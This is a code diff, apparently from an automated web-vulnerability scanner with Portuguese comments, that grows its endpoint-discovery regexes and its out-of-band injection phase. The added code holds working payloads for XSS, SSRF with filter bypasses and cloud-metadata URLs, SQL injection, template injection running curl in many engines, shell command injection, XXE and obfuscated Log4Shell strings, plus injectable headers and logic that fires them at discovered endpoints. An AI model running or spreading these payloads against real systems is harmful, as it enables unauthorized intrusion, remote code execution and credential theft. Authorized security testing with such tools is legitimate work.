@@ -634,22 +634,55 @@ def _endpoint_patterns() -> list[tuple[str, re.Pattern, str]]:
     NQ = r'[^\x22\x27\x60\s]'
     I  = re.I
     return [
+        # ── fetch / axios / http ──────────────────────────────────────────────
         ("fetch_get",      re.compile(rf'(?:fetch|axios\.get|http\.get)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "GET"),
         ("fetch_post",     re.compile(rf'(?:fetch|axios\.post|http\.post)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "POST"),
         ("fetch_put",      re.compile(rf'(?:axios\.put|http\.put)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "PUT"),
         ("fetch_delete",   re.compile(rf'(?:axios\.delete|http\.delete)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "DELETE"),
         ("fetch_patch",    re.compile(rf'(?:axios\.patch|http\.patch)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "PATCH"),
         ("fetch_method",   re.compile(rf'fetch\s*\(\s*{Q}({NQ}{{3,}}){Q}\s*,\s*\{{[^}}]*method\s*:\s*[\x22\x27](\w+)[\x22\x27]', I), "DYNAMIC"),
+        # ── XMLHttpRequest ────────────────────────────────────────────────────
         ("xhr_open",       re.compile(rf'\.open\s*\(\s*[\x22\x27](\w+)[\x22\x27]\s*,\s*{Q}({NQ}{{3,}}){Q}', I), "XHR"),
+        # ── API paths ─────────────────────────────────────────────────────────
         ("api_versioned",  re.compile(rf'{Q}(/api/v\d+[a-zA-Z0-9/_\-]*(?:\?[^\s\x22\x27\x60]*)?){Q}'), "ANY"),
         ("graphql",        re.compile(rf'{Q}((?:/graphql|/gql)(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "POST"),
         ("versioned_path", re.compile(rf'{Q}(/v\d+/[a-zA-Z0-9/_\-]{{3,}}(?:\?[^\s\x22\x27\x60]*)?){Q}'), "ANY"),
         ("router_path",    re.compile(rf'(?:path|route|to|url)\s*:\s*{Q}(/[a-zA-Z0-9/_\-:]{{3,}}(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "GET"),
         ("href_action",    re.compile(rf'(?:href|action)\s*[=:]\s*{Q}(/[a-zA-Z0-9/_\-\.]{{3,}}(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "GET"),
         ("url_with_query", re.compile(rf'{Q}((?:https?://[^\s\x22\x27\x60]+)?/[a-zA-Z0-9/_\-]{{2,}}\?(?:[a-zA-Z0-9_%\-]+=\w+&?)+){Q}', I), "GET"),
+        # ── WebSocket ─────────────────────────────────────────────────────────
         ("websocket",      re.compile(rf'new\s+WebSocket\s*\(\s*{Q}(wss?://[^\s\x22\x27\x60]+){Q}', I), "WS"),
+        # ── Env / config URLs ─────────────────────────────────────────────────
         ("env_url",        re.compile(rf'(?:apiUrl|baseUrl|endpointUrl|API_URL|BASE_URL)\s*[:=]\s*{Q}({NQ}{{5,}}){Q}', I), "ANY"),
-        ("generic_path",   re.compile(rf'{Q}(/(?:api|v\d|auth|user|admin|account|login|logout|register|profile|settings|upload|download|search|order|payment|checkout|cart)[a-zA-Z0-9/_\-]*){Q}', I), "ANY"),
+        # ── Webhook / callback fields no JS ───────────────────────────────────
+        ("webhook_url",    re.compile(rf'(?:webhookUrl|webhook_url|callbackUrl|callback_url|'
+                                      rf'hookUrl|hook_url|notifyUrl|notify_url|'
+                                      rf'ipnUrl|ipn_url|pingUrl|ping_url|'
+                                      rf'returnUrl|return_url|successUrl|success_url)\s*[:=]\s*{Q}({NQ}{{5,}}){Q}', I), "POST"),
+        # ── SSRF via campos de URL de asset remoto ────────────────────────────
+        ("remote_asset",   re.compile(rf'(?:imageUrl|image_url|avatarUrl|avatar_url|'
+                                      rf'thumbnailUrl|thumbnail_url|coverUrl|cover_url|'
+                                      rf'fileUrl|file_url|documentUrl|doc_url|'
+                                      rf'pdfUrl|pdf_url|feedUrl|feed_url|'
+                                      rf'importUrl|import_url|exportUrl|export_url|'
+                                      rf'remoteUrl|remote_url|fetchUrl|fetch_url|'
+                                      rf'proxyUrl|proxy_url|externalUrl|external_url)\s*[:=]\s*{Q}({NQ}{{5,}}){Q}', I), "ANY"),
+        # ── Path param SSRF — /fetch/{url}  /proxy/{target} ──────────────────
+        ("path_param_ssrf",re.compile(rf'{Q}(/(?:fetch|proxy|render|load|download|import|export|'
+                                      rf'preview|screenshot|pdf|convert|mirror|relay|'
+                                      rf'forward|bridge|check|ping|validate|resolve)'
+                                      rf'/[a-zA-Z0-9/_\-\.]{{2,}}){Q}', I), "GET"),
+        # ── GraphQL operações com campos de URL ───────────────────────────────
+        ("graphql_url",    re.compile(rf'(?:importUrl|fetchUrl|uploadFromUrl|downloadUrl)'
+                                      rf'\s*\([^)]*{Q}({NQ}{{5,}}){Q}', I), "POST"),
+        # ── iframe / object / embed src ───────────────────────────────────────
+        ("iframe_src",     re.compile(rf'(?:iframe|frame|object|embed)[^>]*?src\s*=\s*{Q}({NQ}{{5,}}){Q}', I), "GET"),
+        # ── Generic API paths ─────────────────────────────────────────────────
+        ("generic_path",   re.compile(rf'{Q}(/(?:api|v\d|auth|user|admin|account|login|logout|'
+                                      rf'register|profile|settings|upload|download|search|'
+                                      rf'order|payment|checkout|cart|webhook|hook|notify|'
+                                      rf'callback|import|export|fetch|proxy|render)'
+                                      rf'[a-zA-Z0-9/_\-]*){Q}', I), "ANY"),
     ]
 
 ENDPOINT_PATTERNS = _endpoint_patterns()
@@ -919,110 +952,325 @@ def save_endpoints_by_method(endpoints: list[dict], out: Path,
 # FASE 3: OOB INJECTION
 # ─────────────────────────────────────────────────────────────────────────────
 
-# Payloads OOB por tipo de injeção
+# ─────────────────────────────────────────────────────────────────────────────
+# PAYLOADS OOB — expandidos
+# ─────────────────────────────────────────────────────────────────────────────
+
 OOB_PAYLOADS = {
+    # ── XSS ──────────────────────────────────────────────────────────────────
     "xss": [
         '"><img src="https://{OOB}/{ID}" onerror=x>',
         "'><script src=https://{OOB}/{ID}></script>",
         '"><svg/onload=fetch(`https://{OOB}/{ID}`)>',
+        '"><details open ontoggle=fetch(`https://{OOB}/{ID}`)>',
+        '"><iframe src="https://{OOB}/{ID}">',
+        '"><object data="https://{OOB}/{ID}">',
+        "javascript:fetch('https://{OOB}/{ID}')//?",
     ],
+
+    # ── SSRF direto ───────────────────────────────────────────────────────────
     "ssrf": [
         "https://{OOB}/{ID}",
         "http://{OOB}/{ID}",
         "dict://{OOB}:80/{ID}",
+        "ftp://{OOB}/{ID}",
+        "ldap://{OOB}/{ID}",
+        "sftp://{OOB}/{ID}",
     ],
-    "ssti": [
-        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','https://{OOB}/{ID}'],stdout=-1).communicate()}}",
-        "<%= `curl https://{OOB}/{ID}` %>",
-        "#{{\"https://{OOB}/{ID}\".class}}",
+
+    # ── SSRF bypass de filtros ────────────────────────────────────────────────
+    # Usado quando o servidor valida a URL antes de fazer o fetch
+    "ssrf_bypass": [
+        "http://0/{ID}",                          # 0.0.0.0
+        "http://0x7f000001/{ID}",                 # 127.0.0.1 hex
+        "http://2130706433/{ID}",                 # 127.0.0.1 decimal
+        "http://127.1/{ID}",                      # shorthand IPv4
+        "http://[::1]/{ID}",                      # IPv6 localhost
+        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
+        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
+        "http://100.100.100.200/latest/meta-data/",             # Alibaba metadata
+        "http://{OOB}@127.0.0.1/{ID}",           # @ bypass
+        "http://127.0.0.1#{OOB}/{ID}",            # fragment bypass
+        "http://{OOB}%23@127.0.0.1/{ID}",         # encoded #
+        "http://{OOB}%2F{ID}",                    # encoded /
+        "//[{OOB}]/{ID}",                         # IPv6 notation
+        "http://{OOB}\t/{ID}",                    # tab injection
     ],
+
+    # ── SQLi OOB ─────────────────────────────────────────────────────────────
     "sqli": [
         "' AND LOAD_FILE(CONCAT(0x5c5c5c5c,'{OOB}',0x5c5c,'{ID}'))-- -",
         "'; EXEC master..xp_dirtree '\\\\{OOB}\\{ID}';-- -",
         "' AND 1=(SELECT UTL_HTTP.REQUEST('https://{OOB}/{ID}') FROM dual)-- -",
+        "'; COPY (SELECT '') TO PROGRAM 'nslookup {OOB}';-- -",
+        "' AND 1=1 AND LOAD_FILE(0x{hex_oob})-- -",  # hex-encoded OOB
     ],
+
+    # ── SSTI — múltiplos engines ──────────────────────────────────────────────
+    "ssti": [
+        # Jinja2 / Python
+        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','https://{OOB}/{ID}'],stdout=-1).communicate()}}",
+        # Mako (Python)
+        "${__import__('os').popen('curl https://{OOB}/{ID}').read()}",
+        # ERB (Ruby)
+        "<%= `curl https://{OOB}/{ID}` %>",
+        # Groovy (Java)
+        '${"curl https://{OOB}/{ID}".execute().text}',
+        # Freemarker (Java)
+        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl https://{OOB}/{ID}")}',
+        # Smarty (PHP)
+        "{php}shell_exec('curl https://{OOB}/{ID}');{/php}",
+        # Twig (PHP)
+        "{{['curl https://{OOB}/{ID}']|filter('system')}}",
+        # Nunjucks / Pebble (Node.js / Java)
+        "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"curl https://{OOB}/{ID}\")')()}}",
+        # Velocity (Java)
+        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('curl https://{OOB}/{ID}'))",
+        # Java genérico
+        '#{{\"https://{OOB}/{ID}\".class.forName("java.lang.Runtime")}}',
+    ],
+
+    # ── RCE ──────────────────────────────────────────────────────────────────
     "rce": [
         "; curl https://{OOB}/{ID} #",
         "$(curl https://{OOB}/{ID})",
         "`curl https://{OOB}/{ID}`",
+        "| curl https://{OOB}/{ID}",
+        "\ncurl https://{OOB}/{ID}\n",
+        "%3B+curl+https%3A%2F%2F{OOB}%2F{ID}",
+        "; Invoke-WebRequest https://{OOB}/{ID} #",   # PowerShell
+        "; wget https://{OOB}/{ID} #",
+        "; nslookup {OOB} #",                         # DNS only
     ],
+
+    # ── Open Redirect ─────────────────────────────────────────────────────────
     "redirect": [
         "https://{OOB}/{ID}",
         "//https://{OOB}/{ID}",
+        "//{OOB}/{ID}",
         "@{OOB}/{ID}",
+        "https://{OOB}%2F{ID}",
+        "https:/%5C%5C{OOB}/{ID}",
+        "https://{OOB};@legit.com/{ID}",
+        "javascript:fetch('https://{OOB}/{ID}')",
     ],
+
+    # ── XXE ──────────────────────────────────────────────────────────────────
+    "xxe": [
+        # Standard HTTP OOB
+        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "https://{OOB}/{ID}">]><r>&x;</r>',
+        # Parâmetro entity (blind XXE mais efetivo)
+        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % oob SYSTEM "https://{OOB}/{ID}">%oob;]>',
+        # DTD externo — servidor busca o DTD no OOB (exfiltra dados)
+        '<?xml version="1.0"?><!DOCTYPE r SYSTEM "https://{OOB}/{ID}">',
+        # SVG XXE
+        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink"><image xl:href="https://{OOB}/{ID}"/></svg>',
+    ],
+
+    # ── Log4Shell ─────────────────────────────────────────────────────────────
     "log4shell": [
         "${{jndi:ldap://{OOB}/{ID}}}",
         "${{j${{::-n}}di:ldap://{OOB}/{ID}}}",
         "${{jndi:dns://{OOB}/{ID}}}",
+        "${{jndi:rmi://{OOB}/{ID}}}",
+        "${{jndi:ldaps://{OOB}/{ID}}}",
+        # Bypasses de filtro
+        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{OOB}/{ID}}}",
+        "${{${{lower:j}}ndi:ldap://{OOB}/{ID}}}",
+        "${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{OOB}/{ID}}}",
+    ],
+
+    # ── GraphQL ───────────────────────────────────────────────────────────────
+    "graphql": [
+        '{{"query":"{{ importUrl(url:\\"https://{OOB}/{ID}\\") }}"}}',
+        '{{"query":"{{ fetchUrl(url:\\"https://{OOB}/{ID}\\") }}"}}',
+        '{{"query":"mutation {{ uploadFromUrl(url:\\"https://{OOB}/{ID}\\") {{ id }} }}"}}',
     ],
 }
 
-# Headers para injeção (SSRF via header)
+# ─────────────────────────────────────────────────────────────────────────────
+# NOMES DE PARÂMETROS QUE SUGEREM SSRF SERVER-SIDE
+# (o servidor faz o fetch, não o browser)
+# ─────────────────────────────────────────────────────────────────────────────
+
+SSRF_PARAM_NAMES: set[str] = {
+    # Imagens / assets remotos
+    "imageurl", "image_url", "avatarurl", "avatar_url",
+    "thumbnailurl", "thumbnail", "coverurl", "cover",
+    "photourl", "photo_url", "logourl", "logo_url",
+    "iconurl", "icon_url", "bannerurl", "banner_url",
+    # Documentos / arquivos
+    "fileurl", "file_url", "documenturl", "doc_url",
+    "pdfurl", "pdf_url", "attachmenturl", "attachment_url",
+    "downloadurl", "download_url", "uploadurl", "upload_url",
+    # Import / Export
+    "importurl", "import_url", "exporturl", "export_url",
+    "csvurl", "csv_url", "dataurl", "data_url",
+    # Feeds / RSS / Sitemap
+    "feedurl", "feed_url", "rssurl", "rss_url",
+    "sitemapurl", "sitemap_url", "atomurl", "atom_url",
+    # Proxy / Fetch remoto
+    "proxyurl", "proxy_url", "fetchurl", "fetch_url",
+    "remoteurl", "remote_url", "externalurl", "external_url",
+    "requesturl", "request_url",
+    # Webhooks / Notificações
+    "webhookurl", "webhook_url", "callbackurl", "callback_url",
+    "notifyurl", "notify_url", "notificationurl", "notification_url",
+    "ipnurl", "ipn_url", "pingurl", "ping_url",
+    "hookurl", "hook_url", "returnurl", "return_url",
+    "successurl", "success_url", "failureurl", "failure_url",
+    "cancelurl", "cancel_url", "redirecturl", "redirect_url",
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# HEADERS OOB — expandidos
+# ─────────────────────────────────────────────────────────────────────────────
+
 OOB_HEADERS: list[tuple[str, str]] = [
-    ("X-Forwarded-For",           "https://{OOB}/{ID}"),
-    ("X-Real-IP",                 "{OOB}"),
-    ("Referer",                   "https://{OOB}/{ID}"),
-    ("X-Forwarded-Host",          "{OOB}"),
-    ("X-Original-URL",            "https://{OOB}/{ID}"),
-    ("X-Custom-IP-Authorization", "{OOB}"),
-    ("X-Originating-IP",          "{OOB}"),
-    ("True-Client-IP",            "{OOB}"),
-    ("CF-Connecting-IP",          "{OOB}"),
-    ("X-Host",                    "{OOB}"),
-    ("Forwarded",                 "for={OOB};by={OOB}"),
-    # Log4Shell via headers comuns
-    ("User-Agent",                "${{jndi:ldap://{OOB}/{ID}}}"),
-    ("X-Api-Version",             "${{jndi:ldap://{OOB}/{ID}}}"),
+    # ── SSRF / IP spoofing ────────────────────────────────────────────────────
+    ("X-Forwarded-For",              "https://{OOB}/{ID}"),
+    ("X-Real-IP",                    "{OOB}"),
+    ("X-Forwarded-Host",             "{OOB}"),
+    ("X-Forwarded-Server",           "{OOB}"),
+    ("X-HTTP-Host-Override",         "{OOB}"),
+    ("X-Forwarded-Proto",            "https://{OOB}/{ID}"),
+    ("X-ProxyUser-Ip",               "{OOB}"),
+    ("X-Remote-IP",                  "{OOB}"),
+    ("X-Remote-Addr",                "{OOB}"),
+    ("X-Original-URL",               "https://{OOB}/{ID}"),
+    ("X-Rewrite-URL",                "https://{OOB}/{ID}"),
+    ("X-Custom-IP-Authorization",    "{OOB}"),
+    ("X-Originating-IP",             "{OOB}"),
+    ("True-Client-IP",               "{OOB}"),
+    ("CF-Connecting-IP",             "{OOB}"),
+    ("X-Host",                       "{OOB}"),
+    ("Forwarded",                    "for={OOB};by={OOB}"),
+    ("Via",                          "1.1 {OOB}"),
+    ("Proxy",                        "https://{OOB}/{ID}"),
+
+    # ── Webhook / Callback ────────────────────────────────────────────────────
+    ("X-Callback-URL",               "https://{OOB}/{ID}"),
+    ("X-Hook-URL",                   "https://{OOB}/{ID}"),
+    ("X-Webhook-URL",                "https://{OOB}/{ID}"),
+    ("X-Notification-URL",           "https://{OOB}/{ID}"),
+    ("X-Return-URL",                 "https://{OOB}/{ID}"),
+    ("X-Success-URL",                "https://{OOB}/{ID}"),
+    ("X-Wap-Profile",                "https://{OOB}/{ID}"),
+
+    # ── Referer / Origin ──────────────────────────────────────────────────────
+    ("Referer",                      "https://{OOB}/{ID}"),
+    ("Origin",                       "https://{OOB}"),
+
+    # ── SMTP OOB (quando app envia emails e loga headers) ────────────────────
+    ("Contact",                      "admin@{OOB}"),
+    ("From",                         "user@{OOB}"),
+
+    # ── Log4Shell via headers comuns ──────────────────────────────────────────
+    ("User-Agent",                   "${{jndi:ldap://{OOB}/{ID}}}"),
+    ("X-Api-Version",                "${{jndi:ldap://{OOB}/{ID}}}"),
+    ("X-Forwarded-For",              "${{jndi:ldap://{OOB}/{ID}}}"),  # dupla injeção
+    ("Accept-Language",              "${{jndi:ldap://{OOB}/{ID}}}"),
+    ("Accept",                       "${{jndi:ldap://{OOB}/{ID}}}"),
+    ("DNT",                          "${{jndi:ldap://{OOB}/{ID}}}"),
+    ("X-Arbitrary",                  "${{jndi:ldap://{OOB}/{ID}}}"),
 ]
 
 
-def _choose_payloads(method: str, param_name: str, query_params: str) -> list[tuple[str, str]]:
+# ─────────────────────────────────────────────────────────────────────────────
+# PATH PARAMETER PATTERNS — extrai params de URLs REST
+# ─────────────────────────────────────────────────────────────────────────────
+
+# Detecta paths que sugerem path param de URL (SSRF via path)
+# Ex: /api/fetch/{url}  /proxy/{target}  /render/{imageUrl}
+_PATH_PARAM_SSRF_RE = re.compile(
+    r'/(?:fetch|proxy|render|load|get|download|import|export|'
+    r'preview|screenshot|pdf|convert|transform|mirror|relay|'
+    r'forward|pass|bridge|gate|check|ping|test|validate|resolve)'
+    r'(?:/|\b)',
+    re.I
+)
+
+# Content-Types para testar em endpoints POST/PUT que aceitam dados estruturados
+CONTENT_TYPES_OOB = [
+    ("application/json",                None),
+    ("application/xml",                 None),   # pode acionar XXE
+    ("text/xml",                        None),   # pode acionar XXE
+    ("application/x-www-form-urlencoded", None),
+]
+
+
+def _choose_payloads(method: str, param_name: str, query_params: str,
+                     base_url: str = "") -> list[tuple[str, str]]:
     """
-    Escolhe payloads relevantes para o endpoint baseado no método e nome do param.
+    Escolhe payloads relevantes para o endpoint baseado no método,
+    nome do parâmetro e URL base.
     Retorna lista de (category, payload_template).
     """
     chosen = []
-    pm = param_name.lower()
+    pm     = param_name.lower()
 
-    # Params que sugerem SSRF
-    if any(k in pm for k in ("url", "uri", "endpoint", "host", "callback",
-                               "redirect", "next", "return", "dest", "target",
-                               "link", "src", "source", "domain", "addr", "address")):
-        chosen += [("ssrf", p) for p in OOB_PAYLOADS["ssrf"]]
-        chosen += [("redirect", p) for p in OOB_PAYLOADS["redirect"]]
+    # ── Parâmetro é nome conhecido de SSRF server-side ────────────────────
+    is_ssrf_param = (
+        pm in SSRF_PARAM_NAMES
+        or any(k in pm for k in ("url", "uri", "endpoint", "host", "callback",
+                                  "redirect", "next", "return", "dest", "target",
+                                  "link", "src", "source", "domain", "addr",
+                                  "address", "fetch", "proxy", "remote", "import",
+                                  "export", "feed", "rss", "webhook", "hook",
+                                  "notify", "ipn", "ping", "image", "avatar",
+                                  "thumbnail", "cover", "file", "doc", "pdf"))
+    )
+    if is_ssrf_param:
+        chosen += [("ssrf",        p) for p in OOB_PAYLOADS["ssrf"]]
+        chosen += [("ssrf_bypass", p) for p in OOB_PAYLOADS["ssrf_bypass"][:6]]
+        chosen += [("redirect",    p) for p in OOB_PAYLOADS["redirect"]]
 
-    # Params que sugerem SQLi
+    # ── Parâmetro sugere SQLi ─────────────────────────────────────────────
     if any(k in pm for k in ("id", "user", "name", "search", "query", "q",
                                "filter", "order", "sort", "where", "key",
-                               "email", "login", "pass")):
+                               "email", "login", "pass", "username", "userid",
+                               "item", "product", "category", "tag")):
         chosen += [("sqli", p) for p in OOB_PAYLOADS["sqli"]]
 
-    # Params que sugerem XSS
+    # ── Parâmetro sugere XSS ──────────────────────────────────────────────
     if any(k in pm for k in ("q", "search", "s", "query", "input", "text",
                                "msg", "message", "content", "body", "comment",
-                               "title", "name", "value", "data")):
+                               "title", "name", "value", "data", "html",
+                               "description", "note", "label", "subject")):
         chosen += [("xss", p) for p in OOB_PAYLOADS["xss"]]
 
-    # Params que sugerem SSTI
+    # ── Parâmetro sugere SSTI ─────────────────────────────────────────────
     if any(k in pm for k in ("template", "theme", "view", "layout", "page",
-                               "render", "format")):
-        chosen += [("ssti", p) for p in OOB_PAYLOADS["ssti"]]
+                               "render", "format", "tpl", "tmpl", "engine")):
+        chosen += [("ssti", p) for p in OOB_PAYLOADS["ssti"][:4]]
 
-    # POST/PUT/PATCH sempre recebe SSRF + Log4Shell
+    # ── URL base sugere endpoint de proxy/fetch (SSRF via path) ──────────
+    if base_url and _PATH_PARAM_SSRF_RE.search(base_url):
+        chosen += [("ssrf",        p) for p in OOB_PAYLOADS["ssrf"]]
+        chosen += [("ssrf_bypass", p) for p in OOB_PAYLOADS["ssrf_bypass"][:4]]
+
+    # ── POST/PUT/PATCH sempre recebe SSRF + Log4Shell ─────────────────────
     if method in ("POST", "PUT", "PATCH"):
-        chosen += [("ssrf", p) for p in OOB_PAYLOADS["ssrf"]]
-        chosen += [("log4shell", p) for p in OOB_PAYLOADS["log4shell"]]
+        chosen += [("ssrf",     p) for p in OOB_PAYLOADS["ssrf"]]
+        chosen += [("log4shell",p) for p in OOB_PAYLOADS["log4shell"][:3]]
 
-    # Fallback: qualquer param recebe SSRF básico
+    # ── Fallback: qualquer param recebe SSRF básico ───────────────────────
     if not chosen:
         chosen += [("ssrf", p) for p in OOB_PAYLOADS["ssrf"][:2]]
         chosen += [("xss",  p) for p in OOB_PAYLOADS["xss"][:1]]
 
-    # Log4Shell em todos os endpoints
-    chosen += [("log4shell", p) for p in OOB_PAYLOADS["log4shell"]]
+    # ── Log4Shell em todos (server-side logging pode pegar qualquer param) ─
+    chosen += [("log4shell", p) for p in OOB_PAYLOADS["log4shell"][:3]]
 
-    return chosen
+    # Remove duplicatas mantendo ordem
+    seen_tpls: set[str] = set()
+    deduped = []
+    for cat, tpl in chosen:
+        if tpl not in seen_tpls:
+            seen_tpls.add(tpl)
+            deduped.append((cat, tpl))
+
+    return deduped
 
 
 def _inject_param(url: str, param: str, value: str) -> str:
@@ -1125,7 +1373,7 @@ def inject_endpoint(ep: dict, oob_host: str, plog: PayloadLog,
     all_params = list(dict.fromkeys(params_from_qs + body_params)) or ["q"]
 
     for param in all_params:
-        payloads = _choose_payloads(req_method, param, ep.get("query_params", ""))
+        payloads = _choose_payloads(req_method, param, ep.get("query_params", ""), base_url)
         for category, tpl in payloads:
             uid     = unique_id(category, param)
             payload = tpl.replace("{OOB}", oob_host).replace("{ID}", uid)
